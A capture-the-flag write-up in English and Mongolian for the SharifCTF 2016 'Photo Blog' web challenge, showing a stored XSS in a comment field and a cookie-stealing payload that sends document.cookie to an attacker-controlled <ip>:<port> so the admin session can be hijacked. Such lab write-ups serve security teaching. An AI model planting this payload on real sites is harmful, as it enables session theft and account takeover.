### Photo Blog - web 100
`Log in as admin`

#EN
This task has web interface that allow us to comment. As suggested in task description, we found `/admin.php`
and `/login.php`.

![](https://raw.githubusercontent.com/tuvshuud/1up/master/SharifCTF2016/photoblog100/shot3.png)
![](https://raw.githubusercontent.com/tuvshuud/1up/master/SharifCTF2016/photoblog100/shot4.png)

At home page, entering following payload works `<script>alert(1)</script>`. Then what about getting admin cookie, once he/she reads this. `<script>window.location.href=<ip>:<port>/c.php?c=document.cookie</script>`

Then we got PHPSESSID, using this we can access to `/admin.php`.
![](https://raw.githubusercontent.com/tuvshuud/1up/master/SharifCTF2016/photoblog100/shot1.png)
![](https://raw.githubusercontent.com/tuvshuud/1up/master/SharifCTF2016/photoblog100/shot2.png)

#MN
Энэ даалгавар веб интерфэйстэй байсан ба админ хэрэглэгчээр нэвтэрвэл флаг гарж ирэх байв. Даалгаварын тайлбар дээр бичсний дагуу тухайн веб сервер дээр `/admin.php`,`/login.php` гэсэн файлууд байгааг оллоо.

![](https://raw.githubusercontent.com/tuvshuud/1up/master/SharifCTF2016/photoblog100/shot3.png)
![](https://raw.githubusercontent.com/tuvshuud/1up/master/SharifCTF2016/photoblog100/shot4.png)

Нүүр хуудас дээр байгаа сэтгэгдэл бичих хэсэг дээр жаваскрипт код бичиж үзвэл ажиллаж байна `<script>alert(1)</script>`. Тэгвэл XSS скрипт оруулаад админы cookie-г авчихвал `/admin.php` рүү хандахдаа тухай cookie г ашиглаад орох боломжтой. `<script>window.location.href=<ip>:<port>/c.php?c=document.cookie</script>`

![](https://raw.githubusercontent.com/tuvshuud/1up/master/SharifCTF2016/photoblog100/shot1.png)
![](https://raw.githubusercontent.com/tuvshuud/1up/master/SharifCTF2016/photoblog100/shot2.png)
